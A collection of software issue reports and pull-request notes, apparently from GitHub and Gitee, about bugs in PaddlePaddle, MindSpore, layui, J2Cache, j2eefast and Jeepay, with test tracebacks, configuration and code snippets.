Operation after cost is not working ? ,"I tested using cost layer, it seems the network parsing is stopped after meeting the cost layer ? First I test copy the and add them together: cost_rs is [2] and cost is also [2], there is no effect of paddle addto layer. I also try to use mixed_layer add a activation later, for example: sqrt_l2_cost is still the same as cost, no operation added later. Is there anyway to fix this ? @reyoung   <code>: cost_rs = pd.mse_cost(input=input_rs, label=label_rs) cost = pd.addto(input=[cost_rs, cost_rs]) cost_rs = pd.mse_cost(input=input_rs, label=label_rs) sqrt_l2_cost = math_op(input=cost_rs, act=pd.activation.Sqrt())"
【众智】【计算-AICPU开发】MaxUnpool3D,"AICPU算子接入 计算MaxUnpool3D 的partial inverse。 接口目录：mindspore/ops/operations/nn_ops.py ksize Union[int, tuple[int]] 属性 strides Union[int, tuple[int]] 属性 pads Union[int, tuple[int]] 属性 data_format string 属性 output_shape tuple[int] 属性 x argmax y 对应底层算子 对应底层AICPU算子MaxUnpool3D Classify Name Type Type Range Required Format INPUT x RealNumberType TRUE INPUT argmax IndexNumberType TRUE OUTPUT y RealNumberType TRUE REQUIRED_ATTR ksize list_int TRUE REQUIRED_ATTR strides list_int TRUE REQUIRED_ATTR pads list_int TRUE ATTR data_format string FALSE ATTR output_shape list_int FALSE 标杆接口参考 PyTorch接口： https://pytorch.org/docs/stable/generated/torch.nn.MaxUnpool3d.html 3. 异常处理 4. 算子反向 通过MaxUnpool3DGrad算子实现反向   <code>: class MaxUnpool3D(Primitive):"
net.oschina.j2cache.CacheException: clear() not implemented in Redis Generic Mode,"net.oschina.j2cache.CacheException: clear() not implemented in Redis Generic Mode 配置 程序   <code>: J2cache.broadcast = redis #组播的通道名称 jgroups.channel.name = j2cache jgroups.configXml = /network.xml j2cache.L1.provider_class = ehcache j2cache.L2.provider_class = redis j2cache.serialization = fst ehcache.configXml = /ehcache.xml ehcache3.configXml = /ehcache3.xml ehcache3.defaultHeapSize = 1000 caffeine.region.default = 1000, 1h redis.mode = single #redis storage mode (generic|hash) redis.storage = generic #cluster name just for sharded redis.cluster_name = j2cache ## redis cache namespace optional, default[j2cache] redis.namespace = ## connection redis.hosts = 127.0.0.1:6379 redis.timeout = 2000 redis.password = redis.database = 0 ## redis pub/sub channel name redis.channel = j2cache ## redis pool properties redis.maxTotal = -1 redis.maxIdle = 100 redis.maxWaitMillis = 100 redis.minEvictableIdleTimeMillis = 864000000 redis.minIdle = 10 redis.numTestsPerEvictionRun = 10 redis.lifo = false redis.softMinEvictableIdleTimeMillis = 10 redis.testOnBorrow = true redis.testOnReturn = false redis.testWhileIdle = false redis.timeBetweenEvictionRunsMillis = 300000 redis.blockWhenExhausted = true J2Cache.getChannel().set(""sysCache"",""key"",""value""); System.out.println(J2Cache.getChannel().get(""sysCache"",""key"").getValue()); HashMap&lt;String,Object&gt; map=new HashMap&lt;String,Object&gt;(); J2Cache.getChannel().set(""sysCache"",""map"",map); J2Cache.getChannel().clear(""sysCache"");"
请教input前后缀的问题,"2.8新增的input 属性lay-affix=""clear""，能不能动态加载？ 版本：2.8.0 描述：这个属性能不能通过js在后续加上去，并且即插即用的。我主要是想在表格的单元格中使用input，这个input动态生成的时候，带上这个属性，但好像不起作用。 用的是二锅头的tableEdit插件   <code>: $(.layui-input).attr(""lay-affix""，""clear"") 或是 var input = $('&lt;input class=""layui-input layui-tableEdit-input"" lay-affix=""clear"" style=""z-index: 99999999999;"" type=""text""'+ ' lay-verify='+valcheck+'&gt;'); input.val(othis.oldValue); $(that).append(input),input.focus();"
war打包，启动报错,"什么都没该，最新项目下下来，打成war包，放入tomcat中启动，就报错误：   <code>: *************************** APPLICATION FAILED TO START *************************** Description: An attempt was made to call a method that does not exist. The attempt was made from the following location: com.j2eefast.framework.config.ShiroConfig.sessionManager(ShiroConfig.java:184) The following method did not exist: com.j2eefast.common.core.shiro.ShiroSessionManager.setSessionIdUrlRewritingEnabled(Z)V The method's class, com.j2eefast.common.core.shiro.ShiroSessionManager, is available from the following locations: jar:file:/D:/development/apache-tomcat-8.5.65/webapps/fast/WEB-INF/lib/fast-common-2.2.0.jar!/com/j2eefast/common/core/shiro/ShiroSessionManager.class It was loaded from the following location: file:/D:/development/apache-tomcat-8.5.65/webapps/fast/WEB-INF/lib/fast-common-2.2.0.jar Action: Correct the classpath of your application so that it contains a single, compatible version of com.j2eefast.common.core.shiro.ShiroSessionManager"
"[CT][MS][Probability] Uniform, sample AssertionError with Tensorflow",": /device ascend : -- MindSpore version : 0.6.0 -- Python version : 3.7.5 -- OS platform and distribution : eulerosv2r8.aarch64 -- GCC/Compiler version : 7.3.0 pytest -s test_uniform.py::test_uniform_sample_001 pass   <code>: def test_uniform_sample_001(): shape = (2, 3) low = np.array([0.1, 0.1]).astype(np.float32) high = np.array([0.9, 0.9]).astype(np.float32) fact = NetSampleFactory(shape, low_a=low, high_a=high) fact.forward_cmp() ______________________________________________________________________________ test_uniform_sample_001 _______________________________________________________________________________ @Author(""zwx5320437"") @Level2 def test_uniform_sample_001(): shape = (2, 3) low = np.array([0.1, 0.1]).astype(np.float32) high = np.array([0.9, 0.9]).astype(np.float32) fact = NetSampleFactory(shape, low_a=low, high_a=high) &gt; fact.forward_cmp() test_1.py:2025: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ test_1.py:344: in forward_cmp allclose_nparray(out_tensorflow, out_mindspore, self.loss, self.loss) ../share/utils.py:22: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[0.1806901 , 0.87613344], [0.7790113 , 0.13862506], [0.13881846, 0.7219797 ]], [[0.7755744 , 0.4336599 ], [0.5079667 , 0.624162 ], [0.8905206 , 0.39359146]]], dtype=float32) data_me = array([[[0.8207612 , 0.82781565], [0.4071538 , 0.6569959 ], [0.77250916, 0.31103107]], [[0.7996028 , 0.8131954 ], [0.43214095, 0.6636226 ], [0.77955544, 0.3423844 ]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me)*rtol) loss_count = np.count_nonzero(greater) assert (loss_count/total_count) &lt; rtol,\ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"".\ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[0.1806901 0.87613344 0.7790113 0.13862506 0.13881846 0.7219797 E 0.7755744 0.4336599 0.5079667 0.624162 0.8905206 0.39359146] E data_me_error:[0.8207612 0.82781565 0.4071538 0.6569959 0.77250916 0.31103107 E 0.7996028 0.8131954 0.43214095 0.6636226 0.77955544 0.3423844 ] E loss:[0.6400711 0.04831779 0.37185752 0.51837087 0.6336907 0.4109486 E 0.02402842 0.3795355 0.07582575 0.0394606 0.11096513 0.05120707] ../share/utils.py:15: AssertionError"
fix ft job converge,"Fix fault tolerant job not converge bug, previous way will overwrite optimizer learning_rate settings. Still I add a , we should find a way to update optimization settings per parameter. See: https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/topology.py#L55 some global settings hacking.   <code>: TODO"
[CT][MS]OP maskedselect has  precision abnormal at cpu backend,": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: /device cpu : -- MindSpore version :master -- Python version :python3.7 -- OS platform and distribution : -- GCC/Compiler version : test_maskedselect_3d_fp64 test_maskedselect_4d_fp16 test_maskedselect_5d_int32 test_maskedselect_6d_int16 test_maskedselect_7d_int64 test_maskedselect_x_1x2x3x6_mask_2x3x6 test_maskedselect_x_2x1x1x6_mask_2x3x5x6 test_maskedselect_x_3d_mask_2x1x1 test_maskedselect_x_3d_mask_3d test_maskedselect_x_5x3x4x1_mask_3x1x1 test_maskedselect_x_mask_scalar_tensor pytest -s -v operations/test_maskedselect.py::test_maskedselect_3d_fp64 pytest -s -v operations/test_maskedselect.py::test_maskedselect_4d_fp16 pytest -s -v operations/test_maskedselect.py::test_maskedselect_5d_int32 pytest -s -v operations/test_maskedselect.py::test_maskedselect_6d_int16 pytest -s -v operations/test_maskedselect.py::test_maskedselect_7d_int64 pytest -s -v operations/test_maskedselect.py::test_maskedselect_x_1x2x3x6_mask_2x3x6 pytest -s -v operations/test_maskedselect.py::test_maskedselect_x_2x1x1x6_mask_2x3x5x6 pytest -s -v operations/test_maskedselect.py::test_maskedselect_x_3d_mask_2x1x1 pytest -s -v operations/test_maskedselect.py::test_maskedselect_x_3d_mask_3d pytest -s -v operations/test_maskedselect.py::test_maskedselect_x_5x3x4x1_mask_3x1x1 pytest -s -v operations/test_maskedselect.py::test_maskedselect_x_mask_scalar_tensor CPU master Graph python3.8 PASS   <code>: def test_maskedselect_3d_fp64(): x_np = np.random.randn(1024, 32, 14).astype(np.float64) x = Tensor(x_np) mask_np = x_np &gt; 0.5 mask = Tensor(mask_np) fact = MaskedSelectMock(inputs=[x, mask]) fact.forward_cmp() &gt; fact.grad_cmp() operations/test_maskedselect.py:51: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ share/ops/primitive/maskedselect_ops.py:86: in grad_cmp allclose_nparray(out_torch, out_mindspore, self.loss, self.loss) share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[0. , 0. , 0. , ..., 1.53339994, 0. , 1.00749779], [0. , 0... , 1.43283927], [0.5409475 , 0. , 0. , ..., 0. , 1.56121981, 0. ]]]) data_me = array([[[ 2.59120784e-30, -1.75588655e+00, 1.41758015e-38, ..., -4.78073239e-01, -3.38668656e+05, -9.2175924...[ 1.87789641e+30, 1.60326445e+00, 1.21397455e+23, ..., 1.28317881e+00, 1.56121981e+00, -1.90077162e+00]]]) rtol = 1e-05, atol = 1e-05 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[0. 0. 0. ... 0. 0. 0.] E data_me_error:[-1.75588655e+00 -1.74951947e+00 -1.82583106e+00 ... 2.03581063e+11 E 1.28317881e+00 -1.90077162e+00] E loss:[1.75588655e+00 1.74951947e+00 1.82583106e+00 ... 2.03581063e+11 E 1.28317881e+00 1.90077162e+00] share/utils.py:23: AssertionError"
test_elementwise_mul_mkldnn_op fails,"In a new CI machine , fails http://ci.paddlepaddle.org/viewLog.html?buildId=82557&amp;tab=buildLog&amp;buildTypeId=Paddle_PrCi&amp;logTab=tree&amp;filter=all&amp;_focus=37940   <code>: Intel(R) Xeon(R) CPU E5-2660 v4 @ 2.00GHz test_elementwise_mul_mkldnn_op [08:21:40]550/624 Test #583: test_elementwise_mul_mkldnn_op ......................***Failed 5.15 sec [08:21:40]W0410 08:21:38.063987 53917 device_context.cc:261] Please NOTE: device: 0, CUDA Capability: 61, Driver API Version: 9.1, Runtime API Version: 8.0 [08:21:40]W0410 08:21:38.066761 53917 device_context.cc:269] device: 0, cuDNN Version: 7.0. [08:21:40]test_elementwise_mul_mkldnn_op failed [08:21:40] .......Fssss.................................................... [08:21:40]====================================================================== [08:21:40]FAIL: test_check_output (test_elementwise_mul_mkldnn_op.TestElementwiseMulMKLDNNOp_BroadcastNCHW16c) [08:21:40]---------------------------------------------------------------------- [08:21:40]Traceback (most recent call last): [08:21:40] File ""/paddle/build/python/paddle/fluid/tests/unittests/test_elementwise_mul_op.py"", line 44, in test_check_output [08:21:40] self.check_output() [08:21:40] File ""/paddle/build/python/paddle/fluid/tests/unittests/op_test.py"", line 503, in check_output [08:21:40] check_dygraph) [08:21:40] File ""/paddle/build/python/paddle/fluid/tests/unittests/op_test.py"", line 451, in check_output_with_place [08:21:40] str(actual_t) + "" in class "" + self.__class__.__name__) [08:21:40]AssertionError: Output (Out) has diff at CPUPlace [08:21:40]Expect [[[[0.00125048 0.08492047] [08:21:40] [0.29046938 0.386396 ]] [08:21:40] [08:21:40] [[0.36969334 0.11319863] [08:21:40] [0.21415007 0.1986888 ]] [08:21:40] [08:21:40] [[0.00177243 0.25010154] [08:21:40] [0.40215877 0.04279045]] [08:21:40] [08:21:40] [[0.41721553 0.3375377 ] [08:21:40] [0.46301916 0.00820544]] [08:21:40] [08:21:40] [[0.10934631 0.40422767] [08:21:40] [0.2904416 0.22166422]] [08:21:40] [08:21:40] [[0.49167052 0.0152072 ] [08:21:40] [0.12244622 0.41933575]] [08:21:40] [08:21:40] [[0.10907405 0.1227215 ] [08:21:40] [0.00730317 0.6629001 ]] [08:21:40] [08:21:40] [[0.5631185 0.8816506 ] [08:21:40] [0.4704359 0.36099708]] [08:21:40] [08:21:40] [[0.2228665 0.8427488 ] [08:21:40] [0.07571415 0.1031361 ]] [08:21:40] [08:21:40] [[0.01434026 0.22389263] [08:21:40] [0.06033051 0.18588263]] [08:21:40] [08:21:40] [[0.15922903 0.2645933 ] [08:21:40] [0.05752328 0.9053555 ]] [08:21:40] [08:21:40] [[0.25251266 0.14107876] [08:21:40] [0.0689055 0.0038731 ]] [08:21:40] [08:21:40] [[0.08460373 0.29914436] [08:21:40] [0.16119799 0.5224081 ]] [08:21:40] [08:21:40] [[0.15163004 0.05331361] [08:21:40] [0.13301256 0.23944747]] [08:21:40] [08:21:40] [[0.04832048 0.0109666 ] [08:21:40] [0.3521237 0.81271416]] [08:21:40] [08:21:40] [[0.51281095 0.8913848 ] [08:21:40] [0.33166745 0.04245876]]]] [08:21:40]But Got[[[[0.00125048 0.10934631] [08:21:40] [0.2228665 0.08460373]] [08:21:40] [08:21:40] [[0.08492047 0.40422767] [08:21:40] [0.8427488 0.29914436]] [08:21:40] [08:21:40] [[0.29046938 0.2904416 ] [08:21:40] [0.07571415 0.16119799]] [08:21:40] [08:21:40] [[0.386396 0.22166422] [08:21:40] [0.1031361 0.5224081 ]] [08:21:40] [08:21:40] [[0.36969334 0.49167052] [08:21:40] [0.01434026 0.15163004]] [08:21:40] [08:21:40] [[0.11319863 0.0152072 ] [08:21:40] [0.22389263 0.05331361]] [08:21:40] [08:21:40] [[0.21415007 0.12244622] [08:21:40] [0.06033051 0.13301256]] [08:21:40] [08:21:40] [[0.1986888 0.41933575] [08:21:40] [0.18588263 0.23944747]] [08:21:40] [08:21:40] [[0.00177243 0.10907405] [08:21:40] [0.15922903 0.04832048]] [08:21:40] [08:21:40] [[0.25010154 0.1227215 ] [08:21:40] [0.2645933 0.0109666 ]] [08:21:40] [08:21:40] [[0.40215877 0.00730317] [08:21:40] [0.05752328 0.3521237 ]] [08:21:40] [08:21:40] [[0.04279045 0.6629001 ] [08:21:40] [0.9053555 0.81271416]] [08:21:40] [08:21:40] [[0.41721553 0.5631185 ] [08:21:40] [0.25251266 0.51281095]] [08:21:40] [08:21:40] [[0.3375377 0.8816506 ] [08:21:40] [0.14107876 0.8913848 ]] [08:21:40] [08:21:40] [[0.46301916 0.4704359 ] [08:21:40] [0.0689055 0.33166745]] [08:21:40] [08:21:40] [[0.00820544 0.36099708] [08:21:40] [0.0038731 0.04245876]]]] in class TestElementwiseMulMKLDNNOp_BroadcastNCHW16c [08:21:40] [08:21:40]---------------------------------------------------------------------- [08:21:40]Ran 64 tests in 3.246s [08:21:40] [08:21:40]FAILED (failures=1, skipped=4)"
[CT][MS][OCCM][MultiLabelSoftMarginLoss] The MultiLabelSoftMarginLoss doesn't support float64 on GPU and Ascend.,"The MultiLabelSoftMarginLoss doesn't support float64 on GPU and Ascend The MultiLabelSoftMarginLoss doesn't support float64 on GPU and Ascend MultiLabelSoftMarginLoss 在CPU上支持float64，标杆也支持 但是在GPU上反向报错，Ascend上正向报错，报错见日志 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph GPU： Ascend：   <code>: ________________________________________________________ test_multilabelsoftmarginloss_input_dtype_float64 _________________________________________________________ def test_multilabelsoftmarginloss_input_dtype_float64(): x = Tensor(np.random.randn(2, 3).astype(np.float64)) target = Tensor(np.random.randn(2, 3).astype(np.float64)) input_list = [x, target] fact = MultiLabelSoftMarginLossMock(attributes={'reduction': 'mean'}, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_multilabelsoftmarginloss.py:131: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/multilabelsoftmarginloss_ops.py:78: in grad_cmp out_mindspore = self.grad_mindspore_impl() ../share/ops/nn/multilabelsoftmarginloss_ops.py:68: in grad_mindspore_impl return net(*self.inputs, grad) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:651: in __call__ raise err /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:647: in __call__ output = self._run_construct(args, kwargs) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:413: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/ops/composite/base.py:380: in after_grad return grad_(fn)(*args, **kwargs) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/ops/composite/base.py:370: in after_grad out = _pynative_executor() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PyNativeExecutor object at 0x7f49e783b990&gt; def __call__(self): """""" PyNative executor run grad graph. Return: The return object after running grad graph. """""" &gt; return self._executor() E TypeError: Select GPU operator[Reciprocal] fail! Unsupported data type! E The supported data types are input[Float32], output[Float32]; input[Float16], output[Float16]; , but get input[Float64 ] output[Float64 ] E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:626 SetOperatorInfo ________________________________________________________ test_multilabelsoftmarginloss_input_dtype_float64 _________________________________________________________ def test_multilabelsoftmarginloss_input_dtype_float64(): x = Tensor(np.random.randn(2, 3).astype(np.float64)) target = Tensor(np.random.randn(2, 3).astype(np.float64)) input_list = [x, target] fact = MultiLabelSoftMarginLossMock(attributes={'reduction': 'mean'}, inputs=input_list) &gt; fact.forward_cmp() test_multilabelsoftmarginloss.py:130: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/multilabelsoftmarginloss_ops.py:54: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/nn/multilabelsoftmarginloss_ops.py:45: in forward_mindspore_impl output = net(*self.inputs) ../share/utils.py:199: in __call__ out = super().__call__(*args, **kwargs) /root/archiconda3/envs/zhujunan3/lib/python3.7/site-packages/mindspore/nn/cell.py:651: in __call__ raise err /root/archiconda3/envs/zhujunan3/lib/python3.7/site-packages/mindspore/nn/cell.py:647: in __call__ output = self._run_construct(args, kwargs) /root/archiconda3/envs/zhujunan3/lib/python3.7/site-packages/mindspore/nn/cell.py:413: in _run_construct output = self.construct(*cast_inputs, **kwargs) /root/archiconda3/envs/zhujunan3/lib/python3.7/site-packages/mindspore/nn/loss/loss.py:1230: in construct pos = self.log(self.add(self.exp(-x), 1)) /root/archiconda3/envs/zhujunan3/lib/python3.7/site-packages/mindspore/ops/primitive.py:314: in __call__ return _run_op(self, self.name, args) /root/archiconda3/envs/zhujunan3/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/archiconda3/envs/zhujunan3/lib/python3.7/site-packages/mindspore/ops/primitive.py:802: in _run_op output = _pynative_executor.real_run_op(obj, op_name, args) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PyNativeExecutor object at 0xffff596d0850&gt; args = (Prim[Exp]&lt;base=-1.0, scale=1.0, shift=0.0&gt;, 'Exp', (&lt;[RuntimeError('The pointer[ptr_] is null.\n\n-------------------...cend/hal/device/ascend_device_address.cc:666 CopyDeviceToHost\n') raised in repr()] Tensor object at 0xfffef53cc590&gt;,)) def real_run_op(self, *args): """""" Run single op. Args: args (tuple): Op prim and input arguments. Return: Tensor, result of run op. """""" &gt; return self._executor.real_run_op(*args) E TypeError: Can not select a valid kernel info for [Exp] in AI CORE or AI CPU kernel info candidates list. E E ---------------------------------------------------- E - Kernel Info Candidates List: E ---------------------------------------------------- E E AI CORE: E (&lt;Float16xDefaultFormat&gt;) -&gt; (&lt;Float16xDefaultFormat&gt;) E (&lt;Float32xDefaultFormat&gt;) -&gt; (&lt;Float32xDefaultFormat&gt;) E AI CPU: E {} E Please check the given data type or shape: E AI CORE: : (&lt;Tensor[Float64], (2, 3)&gt;) -&gt; (&lt;Tensor[Float64], (2, 3)&gt;) E AI CPU: : (&lt;Tensor[Float64], (2, 3)&gt;) -&gt; (&lt;Tensor[Float64], (2, 3)&gt;) E For more details, please refer to 'Kernel Select Failed' at https://www.mindspore.cn E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_graph_optimization.cc:379 SetOperatorInfo /root/archiconda3/envs/zhujunan3/lib/python3.7/site-packages/mindspore/common/api.py:974: TypeError ----------------------------------------------------------------------- Captured stderr call -----------------------------------------------------------------------"
数据表格bug,"由于blade 使用的标识符为{{}}所以我将laytpl的标识符设定为 数据表格部分的标识符应该是作者硬编码的{{#}}这样的，所以就导致每次查询出来的结果渲染出来就是数据表格的模板代码。 请作者修复此问题。   <code>: laytpl.config({ open: '&lt;%', close: '%&gt;' });"
Make browserable C   source code into HTMLs,"This PR has been updated to fix https://github.com/PaddlePaddle/Paddle/issues/732. The intention of this PR is to add an additional type of <em>documentation</em>. When I am learning Paddle, I do need this document. Also, a new user asked the same question in https://github.com/PaddlePaddle/Paddle/issues/715. I feel that before Paddle API is fully stable, this document would be useful for many users. What I did is to edit our Dockerfile so that make cmake records all build commands into a JSON file, and install woboq code browser which follows the JSON file to convert all .cc/.h files into .html for convenient code browsing. This idea was from my earlier work at https://github.com/wangkuiyi/paddle-code-browse. If this PR is merged, we can run a Nginx container to serve browsable .html files as the following:   <code>: # load documents in a container paddle-cpu-doc docker run -d --name paddle-cpu-doc paddle:cpu # run nginx to serve documents in paddle-cpu-doc docker run -d --volumes-from paddle-cpu-doc -p 8088:80 nginx"
[ST][MS][NET][fcn8s][910 8p/1p]FPS[380] can not reach 430,"fcn8s网络在910环境训练，8p性能380/fps达不到430，1p性能49/fps达不到57 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:c915f9ed -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220901 MindSpore 版本：编译时间20220904181546 r1.9.0 commit_id:c915f9ed (/): /mode graph test_ms_fcn8s_voc2012_check_loss_910_8p_0001.py test_ms_fcn8s_voc2012_perf_910_1p_0001.py cd solution_test/cases/02network/00cv/fcn8s/train pytest -s test_ms_fcn8s_voc2012_check_loss_910_8p_0001.py 网络训练成功，8p性能能达到430，1p性能能达到57 走给安正气   <code>: 8p性能日志 Train epoch time: 119041.660 ms, per step time: 2903.455 ms Train epoch time: 26891.078 ms, per step time: 655.880 ms Train epoch time: 26892.719 ms, per step time: 655.920 ms Train epoch time: 26880.803 ms, per step time: 655.629 ms Train epoch time: 26901.620 ms, per step time: 656.137 ms Train epoch time: 26902.647 ms, per step time: 656.162 ms Train epoch time: 26891.795 ms, per step time: 655.897 ms Train epoch time: 26889.255 ms, per step time: 655.835 ms Train epoch time: 34752.656 ms, per step time: 847.626 ms Train epoch time: 26881.648 ms, per step time: 655.650 ms Train epoch time: 26887.659 ms, per step time: 655.797 ms Train epoch time: 26889.790 ms, per step time: 655.849 ms Train epoch time: 26888.751 ms, per step time: 655.823 ms Train epoch time: 26888.123 ms, per step time: 655.808 ms Train epoch time: 26888.991 ms, per step time: 655.829 ms Train epoch time: 26885.236 ms, per step time: 655.737 ms Train epoch time: 26883.771 ms, per step time: 655.702 ms Train epoch time: 32862.378 ms, per step time: 801.521 ms Train epoch time: 26883.669 ms, per step time: 655.699 ms Train epoch time: 26887.260 ms, per step time: 655.787 ms"
"使用收银台聚合支付时, 商家的费率, 手续费没有更新上","收银台聚合支付订单创建时, 因为不知道支付渠道, 所以费率, 手续费都为0. 当确定支付渠道后要将 费率, 手续费更新上. 这个代码应该将渠道的费率并计算手续费设置上: https://gitee.com/jeequan/jeepay/blob/master/jeepay-payment/src/main/java/com/jeequan/jeepay/pay/ctrl/payorder/AbstractPayOrderController.java#L174 参考代码:   <code>: payOrder.setIfCode(ifCode); // 这里要将 mchPayPassage 费率信息设置上 供 processChannelMsg时更新上去 payOrder.setMchFeeRate(mchPayPassage.getRate()); payOrder.setMchFeeAmount(AmountUtil.calPercentageFee(payOrder.getAmount(), payOrder.getMchFeeRate()));"
多卡训练中关闭batch drop_last无效,"版本、环境信息 1）PaddlePaddle版本：1.5.2 2）CPU：N/A 3）GPU：8 x TitanX (pascal) CUDA 9.2.88, CUDNN 7.1.4 4）系统环境：Ubuntu 18.04.2 Python 3.6.7 训练信息 1）单机，多卡 2）显存信息： 每张卡12GB 使用PaddleCV中的resnet50在单机8卡上训练图形分类 ，并尝试将batch drop_last关闭。更改代码如下 但实际训练中依旧丢掉了最后一个batch。 在多卡训练下，如果dataset的大小不是batch size的整数倍，是否有其他的办法不drop last ？   <code>: train_reader = paddle.batch(train_reader, batch_size=int(args.batch_size / fluid.core.get_cuda_device_count()), drop_last=False)"
Deploying multiple models at the same time will raise MKLDNN error,"Info C++ API Ubuntu 16.04 CPU MKLDNN GCC 8.2.0 Prepare Please contact danqing to download the demo. The demo only has two group models for test. Download model_test.cc.zip, unzip model_test.cc.zip, use the new model_test.cc to update the old model_test.cc file in the demo. Make and install paddle release2.0 (commit id: ). Set LIB_DIR as the path of PaddleInference in build.sh. Run . Run enable save core file. The first test Run , it does not raise error. If set as true, every model only has one predictor. Otherwise, some models will have several predictors by calling predictor.clone(). Run , it raises segmentation fault error. Run get the following error.   <code>: c7a6a1f9610a9ee018c19d89950d76b38f33aed1 cmake -DCMAKE_BUILD_TYPE=Release -DWITH_PYTHON=OFF -DWITH_MKL=ON -DWITH_GPU=OFF -DON_INFER=ON .. &amp;&amp; make -j &amp;&amp; make inference_lib_dist -j sh build.sh ulimit -c unlimited ./build/model_test --test_groups=0 --single_instance=true single_instance ./build/model_test --test_groups=0 --single_instance=false gdb ./build/model_test core_file ./build/model_test --test_groups=1 --single_instance=true ./build/model_test --test_groups=1 --single_instance=false ./build/model_test --test_groups=""4 5 6"" --single_instance=true"
mysql数据库插入数据获取自增主键bug,你好，我在升级到2.0.8版本后发现mysql数据库下插入数据时，如果当前mysql数据库下不同的表空间中如果存在同名的表，会出现插入失败的问题。原因貌似在于查询mysql中的表的主键的下一个自增值的时候，如下sql返回了多行数据 SELECT AUTO_INCREMENT FROM information_schema. WHERE TABLE_NAME='fp_jsfpmx'   <code>: TABLES
